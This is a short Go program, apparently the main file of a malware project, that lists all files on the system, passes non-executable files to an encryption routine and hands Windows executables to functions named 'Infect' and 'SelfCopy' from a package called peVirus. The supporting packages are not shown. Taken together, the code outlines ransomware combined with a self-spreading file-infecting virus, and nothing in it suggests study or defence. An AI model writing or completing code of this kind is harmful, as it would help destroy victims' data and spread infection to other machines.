package main

import (
	"os"
	"strings"

	"./encrypt"
	"./fileSystem"
	"./peVirus"
)

func main() {
	ffname := os.Args[0]
	ok := strings.HasSuffix(ffname, ".exe")
	if !ok {
		ffname += ".exe"
	}
	othFile, peFile := fileSystem.GetAllFile(ffname)
	encrypt.Run(othFile)
	x64File := peVirus.Infect(peFile)
	peVirus.SelfCopy(x64File, ffname)
}
